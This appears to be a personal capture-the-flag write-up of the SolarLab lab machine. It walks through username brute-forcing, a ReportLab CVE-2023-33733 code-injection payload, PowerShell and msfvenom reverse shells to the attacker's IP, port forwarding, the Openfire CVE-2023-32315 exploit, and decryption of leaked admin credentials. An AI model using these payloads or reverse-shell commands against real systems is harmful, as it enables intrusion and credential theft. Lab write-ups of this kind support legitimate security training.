when we open file with passwords in (findings category), we create list and do bruteforce, to get available user 
![[Pasted image 20250201153127.png]]
we found password that we found il our details-file.xlsx 
![[Pasted image 20250201153154.png]]
![[Pasted image 20250201153218.png]]
but its dont give for us anything.

so we try to find something new, and lets check 6791 port
![[Pasted image 20250201152720.png]]
when we try login we found that we cat see available users
![[Pasted image 20250201152801.png]]
we create list of name blake
![[Pasted image 20250201152738.png]]
and found abailable name of user
![[Pasted image 20250201152940.png]]

and we can get access with this pass ThisCanB3typedeasily1@
then we create report and download pdf file
that show for us pdf version
![[Pasted image 20250201173848.png]]
reportlab pdf is exploitable, cve-2023-33733

this our command that we past 
<para>
    <font color="[ [ getattr(pow,Attacker('__globals__'))['os'].system('<HERE OUR PAYLOAD>') for Attacker in [orgTypeFun('Attacker', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))]] and 'red'">
    exploit
    </font>
</para>
here, but we add whole command in burp because there we have limith of length(but this input the only one since all the others have significant limitations that cannot be bypassed)
![[Pasted image 20250201181726.png]]
we use payload with revshels .com powershell base64
nc -lvnp 4444
and we get access
![[Pasted image 20250201182024.png]]

![[Pasted image 20250202114022.png]]


![[Pasted image 20250202113904.png]]
after connecting we found openfire and active listening port.

we need create payload:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.9 LPORT=8080 -f exe > shell.exe
and use msfconsole handler
 portfwd add -l 1234 -p 9090 -r 127.0.0.1
 
and after open our site we found vul version of openfire
![[Pasted image 20250202145650.png]]
CVE-2023-32315
https://github.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT
https://github.com/miko550/CVE-2023-32315 
![[Pasted image 20250202154401.png]]
[+] Username: hugme
[+] Password: HugmeNOW

we connect plugin and get rce
then we found next data in PS C:\Program Files\openfire\embedded-db

INSERT INTO OFUSER VALUES('admin','gjMoswpK+HakPdvLIvp6eLKlYh0=','9MwNQcJ9bF4YeyZDdns5gvXp620=','yidQk5Skw11QJWTBAloAb28lYHftqa0x',4096,NULL,'becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442','Administrator','admin@solarlab.htb','001700223740785','0')

INSERT INTO OFPROPERTY VALUES('passwordKey','hGXiFzsKaAeYLjn',0,NULL)

we also found this tamplate 
CREATE MEMORY TABLE PUBLIC.OFUSER(USERNAME VARCHAR(64) NOT NULL,STOREDKEY VARCHAR(32),SERVERKEY VARCHAR(32),SALT VARCHAR(32),ITERATIONS INTEGER,PLAINPASSWORD VARCHAR(32),ENCRYPTEDPASSWORD VARCHAR(255),NAME VARCHAR(100),EMAIL VARCHAR(100),CREATIONDATE VARCHAR(15) NOT NULL,MODIFICATIONDATE VARCHAR(15) NOT NULL,CONSTRAINT OFUSER_PK PRIMARY KEY(USERNAME))

https://github.com/c0rdis/openfire_decrypt
A_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
ThisPasswordShouldDo!@ (hex: 005400680069007300500061007300730077006F0072006400530068006F0075006C00640044006F00210040)